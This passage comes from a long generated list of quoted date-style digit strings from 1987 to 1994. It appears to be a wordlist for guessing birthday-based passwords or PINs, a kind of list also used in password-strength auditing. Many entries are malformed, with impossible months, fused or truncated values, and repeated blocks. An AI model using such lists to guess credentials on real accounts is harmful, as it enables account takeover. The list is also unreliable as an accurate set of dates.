1992','24081992','24091992','24001992','25111992','25121992','26011992','26021992','26031992','26041992','26051992','26061992','26071992','26081992','26091992','26001992','27111992','27121992','27011992','27021992','27031992','27041992','27051992','27061992','27071992','27081992','27091992','27001992','28111992','28121992','28011992','28021992','28031992','28041992','28051992','28061992','28071992','28081992','28091992','28001992','29111992','29121992','29011992','29021992','29031992','29041992','29051992','29061992','29071992','29081992','29091992','29001992','20111992','20121992','20131992','20011992','20021992','20031992','20041992','20051992','20061992','20071992','20081992','200919921992','011219921992','011319921992','011419921992','01151992','01161992','01171992','01181992','01191992','01101992','01011992','01021992','01031992','01041992','01051992','01061992','01071992','01081992','01091992','02111992','02121992','02011992','02021992','02031992','02041992','02051992','02061992','02071992','02081992','02091992','03111992','03121992','03011992','03021992','03031992','03041992','03051992','03061992','03071992','03081992','03091992','03001992','04111992','04121992','04011992','04021992','04031992','04041992','04051992','04061992','04071992','04081992','04091992','05111992','05121992','05011992','05021992','05031992','05041992','05051992','05061992','05071992','05081992','05091992','05001992','06111992','06121992','06011992','06021992','06031992','06041992','06051992','06061992','06071992','06081992','06091992','06001992','07111992','07121992','07011992','07021992','07031992','07041992','07051992','07061992','07071992','07081992','07091992','07001992','08111992','08121992','08011992','08021992','08031992','08041992','08051992','08061992','08071992','08081992','08091992','08001992','09111992','09121992','09011992','09021992','09031992','09041992','09051992','09061992','09071992','09081992','09091992','09001992','11111992','11121992','11011992','11021992','11031992','11041992','11051992','11061992','11071992','11081992','11091992','12111992','12121992','12011992','12021992','12031992','12041992','12051992','12061992','12071992','12081992','12091992','12001992','13111992','13121992','13011992','13021992','13031992','13041992','13051992','13061992','13071992','13081992','13091992','13001992','14111992','14121992','14011992','14021992','14031992','14041992','14051992','14061992','14071992','14081992','14091992','14001992','15111992','15121992','15011992','15021992','15031992','15041992','15051992','15061992','15071992','15081992','15091992','15001992','16111992','16121992','16011992','16021992','16031992','16041992','16051992','16061992','16071992','16081992','16091992','16001992','17111992','17121992','17011992','17021992','17031992','17041992','17051992','17061992','17071992','17081992','17091992','17001992','18111992','18121992','18011992','18021992','18031992','18041992','18051992','18061992','18071992','18081992','18091992','18001992','19111992','19121992','19011992','19021992','19031992','19041992','19051992','19061992','19071992','19081992','19091992','19001992','10111992','10121992','10131992','10011992','10021992','10031992','10041992','10051992','10061992','10071992','10081992','10091992','21111992','21121992','21011992','21021992','21031992','21041992','21051992','21061992','21071992','21081992','21091992','21001992','22111992','22121992','23011992','23021992','23031992','23041992','23051992','23061992','23071992','23081992','23091992','23001992','24111992','24121992','24011992','24021992','24031992','24041992','24051992','24061992','24071992','24081992','24091992','24001992','25111992','25121992','26011992','26021992','26031992','26041992','26051992','26061992','26071992','26081992','26091992','26001992','27111992','27121992','27011992','27021992','27031992','27041992','27051992','27061992','27071992','27081992','27091992','27001992','28111992','28121992','28011992','28021992','28031992','28041992','28051992','28061992','28071992','28081992','28091992','28001992','29111992','29121992','29011992','29021992','29031992','29041992','29051992','29061992','29071992','29081992','29091992','29001992','20111992','20121992','20131992','20011992','20021992','20031992','20041992','20051992','20061992','20071992','20081992','20091992','011192','011292','011392','011492','011592','011692','011792','011892','011992','011092','010192','010292','010392','010492','010592','010692','010792','010892','010992','021192','021292','020192','020292','020392','020492','020592','020692','020792','020892','020992','031192','031292','030192','030292','030392','030492','030592','030692','030792','030892','030992','030092','041192','041292','040192','040292','040392','040492','040592','040692','040792','040892','040992','051192','051292','050192','050292','050392','050492','050592','050692','050792','050892','050992','050092','061192','061292','060192','060292','060392','060492','060592','060692','060792','060892','060992','060092','071192','071292','070192','070292','070392','070492','070592','070692','070792','070892','070992','070092','081192','081292','080192','080292','080392','080492','080592','080692','080792','080892','080992','080092','091192','091292','090192','090292','090392','090492','090592','090692','090792','090892','090992','090092','111192','111292','110192','110292','110392','110492','110592','110692','110792','110892','110992','121192','121292','120192','120292','120392','120492','120592','120692','120792','120892','120992','120092','131192','131292','130192','130292','130392','130492','130592','130692','130792','130892','130992','130092','141192','141292','140192','140292','140392','140492','140592','140692','140792','140892','140992','140092','151192','151292','150192','150292','150392','150492','150592','150692','150792','150892','150992','150092','161192','161292','160192','160292','160392','160492','160592','160692','160792','160892','160992','160092','171192','171292','170192','170292','170392','170492','170592','170692','170792','170892','170992','170092','181192','181292','180192','180292','180392','180492','180592','180692','180792','180892','180992','180092','191192','191292','190192','190292','190392','190492','190592','190692','190792','190892','190992','190092','101192','101292','101392','100192','100292','100392','100492','100592','100692','100792','100892','100992','211192','211292','210192','210292','210392','210492','210592','210692','210792','210892','210992','210092','221192','221292','230192','230292','230392','230492','230592','230692','230792','230892','230992','230092','241192','241292','240192','240292','240392','240492','240592','240692','240792','240892','240992','240092','251192','251292','260192','260292','260392','260492','260592','260692','260792','260892','260992','260092','271192','271292','270192','270292','270392','270492','270592','270692','270792','270892','270992','270092','281192','281292','280192','280292','280392','280492','280592','280692','280792','280892','280992','280092','291192','291292','290192','290292','290392','290492','290592','290692','290792','290892','290992','290092','201192','201292','201392','200192','200292','200392','200492','200592','200692','200792','2008','200992','011193','011293','011393','011493','011593','011693','011793','011893','011993','011093','010193','010293','010393','010493','010593','010693','010793','010893','010993','021193','021293','020193','020293','020393','020493','020593','020693','020793','020893','020993','031193','031293','030193','030293','030393','030493','030593','030693','030793','030893','030993','030093','041193','041293','040193','040293','040393','040493','040593','040693','040793','040893','040993','051193','051293','050193','050293','050393','050493','050593','050693','050793','050893','050993','050093','061193','061293','060193','060293','060393','060493','060593','060693','060793','060893','060993','060093','071193','071293','070193','070293','070393','070493','070593','070693','070793','070893','070993','070093','081193','081293','080193','080293','080393','080493','080593','080693','080793','080893','080993','080093','091193','091293','090193','090293','090393','090493','090593','090693','090793','090893','090993','090093','111193','111293','110193','110293','110393','110493','110593','110693','110793','110893','110993','121193','121293','120193','120293','120393','120493','120593','120693','120793','120893','120993','120093','131193','131293','130193','130293','130393','130493','130593','130693','130793','130893','130993','130093','141193','141293','140193','140293','140393','140493','140593','140693','140793','140893','140993','140093','151193','151293','150193','150293','150393','150493','150593','150693','150793','150893','150993','150093','161193','161293','160193','160293','160393','160493','160593','160693','160793','160893','160993','160093','171193','171293','170193','170293','170393','170493','170593','170693','170793','170893','170993','170093','181193','181293','180193','180293','180393','180493','180593','180693','180793','180893','180993','180093','191193','191293','190193','190293','190393','190493','190593','190693','190793','190893','190993','190093','101193','101293','101393','100193','100293','100393','100493','100593','100693','100793','100893','100993','211193','211293','210193','210293','210393','210493','210593','210693','210793','210893','210993','210093','221193','221293','230193','230293','230393','230493','230593','230693','230793','230893','230993','230093','241193','241293','240193','240293','240393','240493','240593','240693','240793','240893','240993','240093','251193','251293','260193','260293','260393','260493','260593','260693','260793','260893','260993','260093','271193','271293','270193','270293','270393','270493','270593','270693','270793','270893','270993','270093','281193','281293','280193','280293','280393','280493','280593','280693','280793','280893','280993','280093','291193','291293','290193','290293','290393','290493','290593','290693','290793','290893','290993','290093','201193','201293','201393','200193','200293','200393','200493','200593','200693','200793','200893','200993','01111993','01121993','01131993','01141993','01151993','01161993','01171993','01181993','01191993','01101993','01011993','01021993','01031993','01041993','01051993','01061993','01071993','01081993','01091993','02111993','02121993','02011993','02021993','02031993','02041993','02051993','02061993','02071993','02081993','02091993','03111993','03121993','03011993','03021993','03031993','03041993','03051993','03061993','03071993','03081993','03091993','03001993','04111993','04121993','04011993','04021993','04031993','04041993','04051993','04061993','04071993','04081993','04091993','05111993','05121993','05011993','05021993','05031993','05041993','05051993','05061993','05071993','05081993','05091993','05001993','06111993','06121993','06011993','06021993','06031993','06041993','06051993','06061993','06071993','06081993','06091993','06001993','07111993','07121993','07011993','07021993','07031993','07041993','07051993','07061993','07071993','07081993','07091993','07001993','08111993','08121993','08011993','08021993','08031993','08041993','08051993','08061993','08071993','08081993','08091993','08001993','09111993','09121993','09011993','09021993','09031993','09041993','09051993','09061993','09071993','09081993','09091993','09001993','11111993','11121993','11011993','11021993','11031993','11041993','11051993','11061993','11071993','11081993','11091993','12111993','12121993','12011993','12021993','12031993','12041993','12051993','12061993','12071993','12081993','12091993','12001993','13111993','13121993','13011993','13021993','13031993','13041993','13051993','13061993','13071993','13081993','13091993','13001993','14111993','14121993','14011993','14021993','14031993','14041993','14051993','14061993','14071993','14081993','14091993','14001993','15111993','15121993','15011993','15021993','15031993','15041993','15051993','15061993','15071993','15081993','15091993','15001993','16111993','16121993','16011993','16021993','16031993','16041993','16051993','16061993','16071993','16081993','16091993','16001993','17111993','17121993','17011993','17021993','17031993','17041993','17051993','17061993','17071993','17081993','17091993','17001993','18111993','18121993','18011993','18021993','18031993','18041993','18051993','18061993','18071993','18081993','18091993','18001993','19111993','19121993','19011993','19021993','19031993','19041993','19051993','19061993','19071993','19081993','19091993','19001993','10111993','10121993','10131993','10011993','10021993','10031993','10041993','10051993','10061993','10071993','10081993','10091993','21111993','21121993','21011993','21021993','21031993','21041993','21051993','21061993','21071993','21081993','21091993','21001993','22111993','22121993','23011993','23021993','23031993','23041993','23051993','23061993','23071993','23081993','23091993','23001993','24111993','24121993','24011993','24021993','24031993','24041993','24051993','24061993','24071993','24081993','24091993','24001993','25111993','25121993','26011993','26021993','26031993','26041993','26051993','26061993','26071993','26081993','26091993','26001993','27111993','27121993','27011993','27021993','27031993','27041993','27051993','27061993','27071993','27081993','27091993','27001993','28111993','28121993','28011993','28021993','28031993','28041993','28051993','28061993','28071993','28081993','28091993','28001993','29111993','29121993','29011993','29021993','29031993','29041993','29051993','29061993','29071993','29081993','29091993','29001993','20111993','20121993','20131993','20011993','20021993','20031993','20041993','20051993','20061993','20071993','20081993','20091993','01111994','01121994','01131994','01141994','01151994','01161994','01171994','01181994','01191994','01101994','01011994','01021994','01031994','01041994','01051994','01061994','01071994','01081994','01091994','02111994','02121994','02011994','02021994','02031994','02041994','02051994','02061994','02071994','02081994','02091994','03111994','03121994','03011994','03021994','03031994','03041994','03051994','03061994','03071994','03081994','03091994','03001994','04111994','04121994','04011994','04021994','04031994','04041994','04051994','04061994','04071994','04081994','04091994','05111994','05121994','05011994','05021994','05031994','05041994','05051994','05061994','05071994','05081994','05091994','05001994','06111994','06121994','06011994','06021994','06031994','06041994','06051994','06061994','06071994','06081994','06091994','06001994','07111994','07121994','07011994','07021994','07031994','07041994','07051994','07061994','07071994','07081994','07091994','07001994','08111994','08121994','08011994','08021994','08031994','08041994','08051994','08061994','08071994','08081994','08091994','08001994','09111994','09121994','09011994','09021994','09031994','09041994','09051994','09061994','09071994','09081994','09091994','09001994','11111994','11121994','11011994','11021994','11031994','11041994','11051994','11061994','11071994','11081994','11091994','12111994','12121994','12011994','12021994','12031994','12041994','12051994','12061994','12071994','12081994','12091994','12001994','13111994','13121994','13011994','13021994','13031994','13041994','13051994','13061994','13071994','13081994','13091994','13001994','14111994','14121994','14011994','14021994','14031994','14041994','14051994','14061994','14071994','14081994','14091994','14001994','15111994','15121994','15011994','15021994','15031994','15041994','15051994','15061994','15071994','15081994','15091994','15001994','16111994','16121994','16011994','16021994','16031994','16041994','16051994','16061994','16071994','16081994','16091994','16001994','17111994','17121994','17011994','17021994','17031994','17041994','17051994','17061994','17071994','17081994','17091994','17001994','18111994','18121994','18011994','18021994','18031994','18041994','18051994','18061994','18071994','18081994','18091994','18001994','19111994','19121994','19011994','19021994','19031994','19041994','19051994','19061994','19071994','19081994','19091994','19001994','10111994','10121994','10131994','10011994','10021994','10031994','10041994','10051994','10061994','10071994','10081994','10091994','21111994','21121994','21011994','21021994','21031994','21041994','21051994','21061994','21071994','21081994','21091994','21001994','22111994','22121994','23011994','23021994','23031994','23041994','23051994','23061994','23071994','23081994','23091994','23001994','24111994','24121994','24011994','24021994','24031994','24041994','24051994','24061994','24071994','24081994','24091994','24001994','25111994','25121994','26011994','26021994','26031994','26041994','26051994','26061994','26071994','26081994','26091994','26001994','27111994','27121994','27011994','27021994','27031994','27041994','27051994','27061994','27071994','27081994','27091994','27001994','28111994','28121994','28011994','28021994','28031994','28041994','28051994','28061994','28071994','28081994','28091994','28001994','29111994','29121994','29011994','29021994','29031994','29041994','29051994','29061994','29071994','29081994','29091994','29001994','20111994','20121994','20131994','20011994','20021994','20031994','20041994','20051994','20061994','20071994','20081994','20091994','011194','011294','011394','011494','011594','011694','011794','011894','011994','011094','010194','010294','010394','010494','010594','010694','010794','010894','010994','021194','021294','020194','020294','020394','020494','020594','020694','020794','020894','020994','031194','031294','030194','030294','030394','030494','030594','030694','030794','030894','030994','030094','041194','041294','040194','040294','040394','040494','040594','040694','040794','040894','040994','051194','051294','050194','050294','050394','050494','050594','050694','050794','050894','050994','050094','061194','061294','060194','060294','060394','060494','060594','060694','060794','060894','060994','060094','071194','071294','070194','070294','070394','070494','070594','070694','070794','070894','070994','070094','081194','081294','080194','080294','080394','080494','080594','080694','080794','080894','080994','080094','091194','091294','090194','090294','090394','090494','090594','090694','090794','090894','090994','090094','111194','111294','110194','110294','110394','110494','110594','110694','110794','110894','110994','121194','121294','120194','120294','120394','120494','120594','120694','120794','120894','120994','120094','131194','131294','130194','130294','130394','130494','130594','130694','130794','130894','130994','130094','141194','141294','140194','140294','140394','140494','140594','140694','140794','140894','140994','140094','151194','151294','150194','150294','150394','150494','150594','150694','150794','150894','150994','150094','161194','161294','160194','160294','160394','160494','160594','160694','160794','160894','160994','160094','171194','171294','170194','170294','170394','170494','170594','170694','170794','170894','170994','170094','181194','181294','180194','180294','180394','180494','180594','180694','180794','180894','180994','180094','191194','191294','190194','190294','190394','190494','190594','190694','190794','190894','190994','190094','101194','101294','101394','100194','100294','100394','100494','100594','100694','100794','100894','100994','211194','211294','210194','210294','210394','210494','210594','210694','210794','210894','210994','210094','221194','221294','230194','230294','230394','230494','230594','230694','230794','230894','230994','230094','241194','241294','240194','240294','240394','240494','240594','240694','240794','240894','240994','240094','251194','251294','260194','260294','260394','260494','260594','260694','260794','260894','260994','260094','271194','271294','270194','270294','270394','270494','270594','270694','270794','270894','270994','270094','281194','281294','280194','280294','280394','280494','280594','280694','280794','280894','280994','280094','291194','291294','290194','290294','290394','290494','290594','290694','290794','290894','290994','290094','201194','201294','201394','200194','200294','200394','200494','200594','200694','200794','200894','200994','011189','011289','011389','011489','011589','011689','011789','011889','011989','011089','010189','010289','010389','010489','010589','010689','010789','010889','010989','021189','021289','020189','020289','020389','020489','020589','020689','020789','020889','020989','031189','031289','030189','030289','030389','030489','030589','030689','030789','030889','030989','030089','041189','041289','040189','040289','040389','040489','040589','040689','040789','040889','040989','051189','051289','050189','050289','050389','050489','050589','050689','050789','050889','050989','050089','061189','061289','060189','060289','060389','060489','060589','060689','060789','060889','060989','060089','071189','071289','070189','070289','070389','070489','070589','070689','070789','070889','070989','070089','081189','081289','080189','080289','080389','080489','080589','080689','080789','080889','080989','080089','091189','091289','090189','090289','090389','090489','090589','090689','090789','090889','090989','090089','111189','111289','110189','110289','110389','110489','110589','110689','110789','110889','110989','121189','121289','120189','120289','120389','120489','120589','120689','120789','120889','120989','120089','131189','131289','130189','130289','130389','130489','130589','130689','130789','130889','130989','130089','141189','141289','140189','140289','140389','140489','140589','140689','140789','140889','140989','140089','151189','151289','150189','150289','150389','150489','150589','150689','150789','150889','150989','150089','161189','161289','160189','160289','160389','160489','160589','160689','160789','160889','160989','160089','171189','171289','170189','170289','170389','170489','170589','170689','170789','170889','170989','170089','181189','181289','180189','180289','180389','180489','180589','180689','180789','180889','180989','180089','191189','191289','190189','190289','190389','190489','190589','190689','190789','190889','190989','190089','101189','101289','101389','100189','100289','100389','100489','100589','100689','100789','100889','100989','211189','211289','210189','210289','210389','210489','210589','210689','210789','210889','210989','210089','221189','221289','230189','230289','230389','230489','230589','230689','230789','230889','230989','230089','241189','241289','240189','240289','240389','240489','240589','240689','240789','240889','240989','240089','251189','251289','260189','260289','260389','260489','260589','260689','260789','260889','260989','260089','271189','271289','270189','270289','270389','270489','270589','270689','270789','270889','270989','270089','281189','281289','280189','280289','280389','280489','280589','280689','280789','280889','280989','280089','291189','291289','290189','290289','290389','290489','290589','290689','290789','290889','290989','290089','201189','201289','201389','200189','200289','01111989','01121989','01131989','01141989','01151989','01161989','01171989','01181989','01191989','01101989','01011989','01021989','01031989','01041989','01051989','01061989','01071989','01081989','01091989','02111989','02121989','02011989','02021989','02031989','02041989','02051989','02061989','02071989','02081989','02091989','03111989','03121989','03011989','03021989','03031989','03041989','03051989','03061989','03071989','03081989','03091989','03001989','04111989','04121989','04011989','04021989','04031989','04041989','04051989','04061989','04071989','04081989','04091989','05111989','05121989','05011989','05021989','05031989','05041989','05051989','05061989','05071989','05081989','05091989','05001989','06111989','06121989','06011989','06021989','06031989','06041989','06051989','06061989','06071989','06081989','06091989','06001989','07111989','07121989','07011989','07021989','07031989','07041989','07051989','07061989','07071989','07081989','07091989','07001989','08111989','08121989','08011989','08021989','08031989','08041989','08051989','08061989','08071989','08081989','08091989','08001989','09111989','09121989','09011989','09021989','09031989','09041989','09051989','09061989','09071989','09081989','09091989','09001989','11111989','11121989','11011989','11021989','11031989','11041989','11051989','11061989','11071989','11081989','11091989','12111989','12121989','12011989','12021989','12031989','12041989','12051989','12061989','12071989','12081989','12091989','12001989','13111989','13121989','13011989','13021989','13031989','13041989','13051989','13061989','13071989','13081989','13091989','13001989','14111989','14121989','14011989','14021989','14031989','14041989','14051989','14061989','14071989','14081989','14091989','14001989','15111989','15121989','15011989','15021989','15031989','15041989','15051989','15061989','15071989','15081989','15091989','15001989','16111989','16121989','16011989','16021989','16031989','16041989','16051989','16061989','16071989','16081989','16091989','16001989','17111989','17121989','17011989','17021989','17031989','17041989','17051989','17061989','17071989','17081989','17091989','17001989','18111989','18121989','18011989','18021989','18031989','18041989','18051989','18061989','18071989','18081989','18091989','18001989','19111989','19121989','19011989','19021989','19031989','19041989','19051989','19061989','19071989','19081989','19091989','19001989','10111989','10121989','10131989','10011989','10021989','10031989','10041989','10051989','10061989','10071989','10081989','10091989','21111989','21121989','21011989','21021989','21031989','21041989','21051989','21061989','21071989','21081989','21091989','21001989','22111989','22121989','23011989','23021989','23031989','23041989','23051989','23061989','23071989','23081989','23091989','23001989','24111989','24121989','24011989','24021989','24031989','24041989','24051989','24061989','24071989','24081989','24091989','24001989','25111989','25121989','26011989','26021989','26031989','26041989','26051989','26061989','26071989','26081989','26091989','26001989','27111989','27121989','27011989','27021989','27031989','27041989','27051989','27061989','27071989','27081989','27091989','27001989','28111989','28121989','28011989','28021989','28031989','28041989','28051989','28061989','28071989','28081989','28091989','28001989','29111989','29121989','29011989','29021989','29031989','29041989','29051989','29061989','29071989','29081989','29091989','29001989','20111989','20121989','20131989','20011989','20021989','20031989','20041989','20051989','20061989','20071989','20081989','20091989200389','200489','200589','200689','200789','200889','200989','01111989','01121989','01131989','01141989','01151989','01161989','01171989','01181989','01191989','01101989','01011989','01021989','01031989','01041989','01051989','01061989','01071989','01081989','01091989','02111989','02121989','02011989','02021989','02031989','02041989','02051989','02061989','02071989','02081989','02091989','03111989','03121989','03011989','03021989','03031989','03041989','03051989','03061989','03071989','03081989','03091989','03001989','04111989','04121989','04011989','04021989','04031989','04041989','04051989','04061989','04071989','04081989','04091989','05111989','05121989','05011989','05021989','05031989','05041989','05051989','05061989','05071989','05081989','05091989','05001989','06111989','06121989','06011989','06021989','06031989','06041989','06051989','06061989','06071989','06081989','06091989','06001989','07111989','07121989','07011989','07021989','07031989','07041989','07051989','07061989','07071989','07081989','07091989','07001989','08111989','08121989','08011989','08021989','08031989','08041989','08051989','08061989','08071989','08081989','08091989','08001989','09111989','09121989','09011989','09021989','09031989','09041989','09051989','09061989','09071989','09081989','09091989','09001989','11111989','11121989','11011989','11021989','11031989','11041989','11051989','11061989','11071989','11081989','11091989','12111989','12121989','12011989','12021989','12031989','12041989','12051989','12061989','12071989','12081989','12091989','12001989','13111989','13121989','13011989','13021989','13031989','13041989','13051989','13061989','13071989','13081989','13091989','13001989','14111989','14121989','14011989','14021989','14031989','14041989','14051989','14061989','14071989','14081989','14091989','14001989','15111989','15121989','15011989','15021989','15031989','15041989','15051989','15061989','15071989','15081989','15091989','15001989','16111989','16121989','16011989','16021989','16031989','16041989','16051989','16061989','16071989','16081989','16091989','16001989','17111989','17121989','17011989','17021989','17031989','17041989','17051989','17061989','17071989','17081989','17091989','17001989','18111989','18121989','18011989','18021989','18031989','18041989','18051989','18061989','18071989','18081989','18091989','18001989','19111989','19121989','19011989','19021989','19031989','19041989','19051989','19061989','19071989','19081989','19091989','19001989','10111989','10121989','10131989','10011989','10021989','10031989','10041989','10051989','10061989','10071989','10081989','10091989','21111989','21121989','21011989','21021989','21031989','21041989','21051989','21061989','21071989','21081989','21091989','21001989','22111989','22121989','23011989','23021989','23031989','23041989','23051989','23061989','23071989','23081989','23091989','23001989','24111989','24121989','24011989','24021989','24031989','24041989','24051989','24061989','24071989','24081989','24091989','24001989','25111989','25121989','26011989','26021989','26031989','26041989','26051989','26061989','26071989','26081989','26091989','26001989','27111989','27121989','27011989','27021989','27031989','27041989','27051989','27061989','27071989','27081989','27091989','27001989','28111989','28121989','28011989','28021989','28031989','28041989','28051989','28061989','28071989','28081989','28091989','28001989','29111989','29121989','29011989','29021989','29031989','29041989','29051989','29061989','29071989','29081989','29091989','29001989','20111989','20121989','20131989','20011989','20021989','20031989','20041989','20051989','20061989','20071989','20081989','20091989','011188','011288','011388','011488','011588','011688','011788','011888','011988','011088','010188','010288','010388','010488','010588','010688','010788','010888','010988','021188','021288','020188','020288','020388','020488','020588','020688','020788','020888','020988','031188','031288','030188','030288','030388','030488','030588','030688','030788','030888','030988','030088','041188','041288','040188','040288','040388','040488','040588','040688','040788','040888','040988','051188','051288','050188','050288','050388','050488','050588','050688','050788','050888','050988','050088','061188','061288','060188','060288','060388','060488','060588','060688','060788','060888','060988','060088','071188','071288','070188','070288','070388','070488','070588','070688','070788','070888','070988','070088','081188','081288','080188','080288','080388','080488','080588','080688','080788','080888','080988','080088','091188','091288','090188','090288','090388','090488','090588','090688','090788','090888','090988','090088','111188','111288','110188','110288','110388','110488','110588','110688','110788','110888','110988','121188','121288','120188','120288','120388','120488','120588','120688','120788','120888','120988','120088','131188','131288','130188','130288','130388','130488','130588','130688','130788','130888','130988','130088','141188','141288','140188','140288','140388','140488','140588','140688','140788','140888','140988','140088','151188','151288','150188','150288','150388','150488','150588','150688','150788','150888','150988','150088','161188','161288','160188','160288','160388','160488','160588','160688','160788','160888','160988','160088','171188','171288','170188','170288','170388','170488','170588','170688','170788','170888','170988','170088','181188','181288','180188','180288','180388','180488','180588','180688','180788','180888','180988','180088','191188','191288','190188','190288','190388','190488','190588','190688','190788','190888','190988','190088','101188','101288','101388','100188','100288','100388','100488','100588','100688','100788','100888','100988','211188','211288','210188','210288','210388','210488','210588','210688','210788','210888','210988','210088','221188','221288','230188','230288','230388','230488','230588','230688','230788','230888','230988','230088','241188','241288','240188','240288','240388','240488','240588','240688','240788','240888','240988','240088','251188','251288','260188','260288','260388','260488','260588','260688','260788','260888','260988','260088','271188','271288','270188','270288','270388','270488','270588','270688','270788','270888','270988','270088','281188','281288','280188','280288','280388','280488','280588','280688','280788','280888','280988','280088','291188','291288','290188','290288','290388','290488','290588','290688','290788','290888','290988','290088','201188','201288','201388','200188','200288','200388','200488','200588','200688','200788','200888','200988','01111988','01121988','01131988','01141988','01151988','01161988','01171988','01181988','01191988','01101988','01011988','01021988','01031988','01041988','01051988','01061988','01071988','01081988','01091988','02111988','02121988','02011988','02021988','02031988','02041988','02051988','02061988','02071988','02081988','02091988','03111988','03121988','03011988','03021988','03031988','03041988','03051988','03061988','03071988','03081988','03091988','03001988','04111988','04121988','04011988','04021988','04031988','04041988','04051988','04061988','04071988','04081988','04091988','05111988','05121988','05011988','05021988','05031988','05041988','05051988','05061988','05071988','05081988','05091988','05001988','06111988','06121988','06011988','06021988','06031988','06041988','06051988','06061988','06071988','06081988','06091988','06001988','07111988','07121988','07011988','07021988','07031988','07041988','07051988','07061988','07071988','07081988','07091988','07001988','08111988','08121988','08011988','08021988','08031988','08041988','08051988','08061988','08071988','08081988','08091988','08001988','09111988','09121988','09011988','09021988','09031988','09041988','09051988','09061988','09071988','09081988','09091988','09001988','11111988','11121988','11011988','11021988','11031988','11041988','11051988','11061988','11071988','11081988','11091988','12111988','12121988','12011988','12021988','12031988','12041988','12051988','12061988','12071988','12081988','12091988','12001988','13111988','13121988','13011988','13021988','13031988','13041988','13051988','13061988','13071988','13081988','13091988','13001988','14111988','14121988','14011988','14021988','14031988','14041988','14051988','14061988','14071988','14081988','14091988','14001988','15111988','15121988','15011988','15021988','15031988','15041988','15051988','15061988','15071988','15081988','15091988','15001988','16111988','16121988','16011988','16021988','16031988','16041988','16051988','16061988','16071988','16081988','16091988','16001988','17111988','17121988','17011988','17021988','17031988','17041988','17051988','17061988','17071988','17081988','17091988','17001988','18111988','18121988','18011988','18021988','18031988','18041988','18051988','18061988','18071988','18081988','18091988','18001988','19111988','19121988','19011988','19021988','19031988','19041988','19051988','19061988','19071988','19081988','19091988','19001988','10111988','10121988','10131988','10011988','10021988','10031988','10041988','10051988','10061988','10071988','10081988','10091988','21111988','21121988','21011988','21021988','21031988','21041988','21051988','21061988','21071988','21081988','21091988','21001988','22111988','22121988','23011988','23021988','23031988','23041988','23051988','23061988','23071988','23081988','23091988','23001988','24111988','24121988','24011988','24021988','24031988','24041988','24051988','24061988','24071988','24081988','24091988','24001988','25111988','25121988','26011988','26021988','26031988','26041988','26051988','26061988','26071988','26081988','26091988','26001988','27111988','27121988','27011988','27021988','27031988','27041988','27051988','27061988','27071988','27081988','27091988','27001988','28111988','28121988','28011988','28021988','28031988','28041988','28051988','28061988','28071988','28081988','28091988','28001988','29111988','29121988','29011988','29021988','29031988','29041988','29051988','29061988','29071988','29081988','29091988','29001988','20111988','20121988','20131988','20011988','20021988','20031988','20041988','20051988','20061988','20071988','20081988','20091988','01111987','01121987','01131987','01141987','01151987','01161987','01171987','01181987','01191987','01101987','01011987','01021987','01031987','01041987','01051987','01061987','01071987','01081987','01091987','02111987','02121987','02011987','02021987','02031987','02041987','02051987','02061987','02071987','02081987','02091987','03111987','03121987','03011987','03021987','03031987','03041987','03051987','03061987','03071987','03081987','03091987','03001987','04111987','04121987','04011987','04021987','04031987','04041987','04051987','04061987','04071987','04081987','04091987','05111987','05121987','05011987','05021987','05031987','05041987','05051987','05061987','05071987','05081987','05091987','05001987','06111987','06121987','06011987','06021987','06031987','06041987','06051987','06061987','06071987','06081987','06091987','06001987','07111987','07121987','07011987','07021987','07031987','07041987','07051987','07061987','07071987','07081987','07091987','07001987','08111987','08121987','08011987','08021987','08031987','08041987','08051987','08061987','08071987','08081987','08091987','08001987','09111987','09121987','09011987','09021987','09031987','09041987','09051987','09061987','09071987','09081987','09091987','09001987','11111987','11121987','11011987','11021987','11031987','11041987','11051987','11061987','11071987','11081987','11091987','12111987','12121987','12011987','12021987','12031987','12041987','12051987','12061987','12071987','12081987','12091987','12001987','13111987','13121987','13011987','13021987','13031987','13041987','13051987','13061987','13071987','13081987','13091987','13001987','14111987','14121987','14011987','14021987','14031987','14041987','14051987','14061987','14071987','14081987','14091987','14001987','15111987','15121987','15011987','15021987','15031987','15041987','15051987','15061987','15071987','15081987','15091987','15001987','16111987','16121987','16011987','16021987','16031987','16041987','16051987','16061987','16071987','16081987','16091987','16001987','17111987','17121987','17011987','17021987','17031987','17041987','17051987','17061987','17071987','17081987','17091987','17001987','18111987','18121987','18011987','18021987','18031987','18041987','18051987','18061987','18071987','18081987','18091987','18001987','19111987','19121987','19011987','19021987','19031987','19041987','19051987','19061987','19071987','19081987','19091987','19001987','10111987','10121987','10131987','10011987','10021987','10031987','10041987','10051987','10061987','10071987','10081987','10091987','21111987','21121987','21011987','21021987','21031987','21041987','21051987','21061987','21071987','21081987','21091987','21001987','22111987','22121987','23011987','23021987','23031987','23041987','23051987','23061987','23071987','23081987','23091987','23001987','24111987','24121987','24011987','24021987','24031987','24041987','24051987','24061987','24071987','24081987','24091987','24001987','25111987','25121987','26011987','26021987','26031987','26041987','26051987','26061987','26071987','26081987','26091987','26001987','27111987','27121987','27011987','27021987','27031987','27041987','27051987','27061987','27071987','27081987','27091987','27001987','28111987','28121987','28011987','28021987','28031987','28041987','28051987','28061987','28071987','28081987','28091987','28001987','29111987','29121987','29011987','29021987','29031987','29041987','29051987','29061987','29071987','29081987','29091987','29001987','20111987','20121987','20131987','20011987','20021987','20031987','20041987','20051987','20061987','20071987','20081987','20091987','011187','011287','011387','011487','011587','011687','011787','011887','011987','011087','010187','010287','010387','010487','010587','010687','010787','010887','010987','021187','021287','020187','020287','020387','020487','020587','020687','020787','020887','020987','031187','031287','030187','030287','030387','030487','030587','030687','030787','030887','030987','030087','041187','041287','040187','040287','040387','040487','040587','040687','040787','040887','040987','051187','051287','050187','050287','050387','050487','050587','050687','050787','050887','050987','050087','061187','061287','060187','060287','060387','060487','060587','060687','060787','060887','060987','060087','071187','071287','070187','070287','070387','070487','070587','070687','070787','070887','070987','070087','081187','081287','080187','080287','080387','080487','080587','080687','080787','080887','080987','080087','091187','091287','090187','090287','090387','090487','090587','090687','090787','090887','090987','090087','111187','111287','110187','110287','110387','110487','110587','110687','110787','110887','110987','121187','121287','120187','120287','120387','120487','120587','120687','120787','120887','120987','120087','131187','131287','130187','130287','130387','130487','130587','130687','130787','130887','130987','130087','141187','141287','140187','140287','140387','140487','140587','140687','140787','140887','140987','140087','151187','151287','150187','150287','150387','150487','150587','150687','150787','150887','150987','150087','161187','161287','160187','160287','160387','160487','160587','160687','160787','160887','160987','160087','171187','171287','170187','170287','170387','170487','170587','170687','170787','170887','170987','170087','181187','181287','180187','180287','180387','180487','180587','180687','180787','180887','180987','180087','191187','191287','190187','190287','190387','190487','